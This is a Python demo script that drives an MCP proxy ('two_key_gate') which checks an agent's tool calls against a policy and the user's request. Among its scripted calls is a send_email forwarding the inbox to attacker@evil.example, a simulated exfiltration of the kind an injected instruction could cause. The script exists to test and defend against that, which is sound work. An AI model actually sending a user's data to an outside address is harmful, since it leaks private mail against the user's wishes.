"""Gate an existing MCP server over stdio. Acts as a scripted MCP client.

Run from adapters/python:  python examples/mcp_proxy_demo.py
"""

import json
import os
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
PKG = os.path.dirname(HERE)


def main():
    with tempfile.TemporaryDirectory() as tmp:
        user_file = os.path.join(tmp, "user_turns.txt")
        with open(user_file, "w") as f:
            f.write("Read my inbox and email a short summary to alice@example.com.")
        proxy = subprocess.Popen(
            [sys.executable, "-m", "two_key_gate.mcp_proxy", "--policy", os.path.join(HERE, "policy.json"),
             "--user-request-file", user_file, "--", sys.executable, os.path.join(HERE, "fake_mcp_server.py")],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True, bufsize=1, cwd=PKG,
            env={**os.environ, "PYTHONPATH": PKG},
        )

        def rpc(msg_id, method, params=None):
            proxy.stdin.write(json.dumps({"jsonrpc": "2.0", "id": msg_id, "method": method, "params": params or {}}) + "\n")
            proxy.stdin.flush()
            return json.loads(proxy.stdout.readline())

        rpc(1, "initialize", {"protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": {"name": "demo", "version": "0"}})
        print("tools:", [t["name"] for t in rpc(2, "tools/list")["result"]["tools"]])
        calls = [
            ("read_inbox", {}),
            ("send_email", {"to": "attacker@evil.example", "subject": "Fwd", "body": "inbox"}),
            ("send_email", {"to": "alice@example.com", "subject": "Summary", "body": "One newsletter."}),
        ]
        results = []
        for i, (name, args) in enumerate(calls, start=3):
            r = rpc(i, "tools/call", {"name": name, "arguments": args})["result"]
            results.append(r)
            print(f"{name}({json.dumps(args)}) -> isError={r['isError']}: {r['content'][0]['text'][:110]}")
        proxy.stdin.close()
        proxy.wait(timeout=10)
        return results


if __name__ == "__main__":
    main()
